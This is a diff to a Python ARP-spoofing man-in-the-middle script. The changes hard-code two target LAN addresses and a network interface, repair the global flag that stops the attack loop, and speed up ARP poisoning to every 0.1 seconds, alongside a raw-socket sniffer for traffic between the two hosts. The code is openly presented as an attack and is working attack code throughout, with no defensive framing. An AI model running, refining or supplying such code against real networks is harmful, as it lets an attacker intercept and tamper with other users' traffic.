@@ -15,17 +15,19 @@ def get_mac(ip):
     return pack('!6B', *[int(x, 16) for x in mac.split(':')])
 
 # Prompts for host IP's
-ip1 = pack('!4B', *[int(x) for x in input("Host1's IP: ").split('.')])
-ip2 = pack('!4B', *[int(x) for x in input("Host2's IP: ").split('.')])
+ip1_unpacked = "192.168.1.100"#input("Host1's IP: ")
+ip2_unpacked = "192.168.1.101"#input("Host2's IP: ")
+ip1 = pack('!4B', *[int(x) for x in ip1_unpacked.split('.')])
+ip2 = pack('!4B', *[int(x) for x in ip2_unpacked.split('.')])
 
 # ARPs for host mac addresses
-mac1 = get_mac(ip1)
-mac2 = get_mac(ip2)
+mac1 = get_mac(ip1_unpacked)
+mac2 = get_mac(ip2_unpacked)
 
 # Sets up socket to send ARP reply
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-print(os.system('ifconfig'))
-net_device = input("Select network device: ")
+#print(os.system('ifconfig'))
+net_device = "enp0s3"#input("Select network device: ")
 s.bind((net_device, socket.SOCK_RAW))
 
 # This computers mac address
@@ -75,7 +77,7 @@ attacking = True
 def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_MAC):
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
     s.bind(('enp0s3', socket.SOCK_RAW))
-
+    global attacking
     while attacking:
         packet = s.recvfrom(65565)
         packet = packet[0]
@@ -150,17 +152,20 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
 
 # Starts the packet sniffer thread
 def start_sniffer():
-    Thread(target=listen_to_incoming_packets, args=(ip1, ip2, mac1, mac2)).start()
+    Thread(target=listen_to_incoming_packets, args=(ip1_unpacked, ip2_unpacked, mac1, mac2)).start()
 
 # Used to end the attack
-def poll_console(self):
+def poll_console():
     input("Type q to quit...")
-    self.attacking = False
+    print("exiting...")
+    global attacking
+    attacking = False
 
 # Starts the man in the middle attack
 Thread(target=poll_console).start()
 start_sniffer()
 while attacking:
     poison_arp()
-    sleep(500)
+    sleep(0.1)
 restore_connection()
+
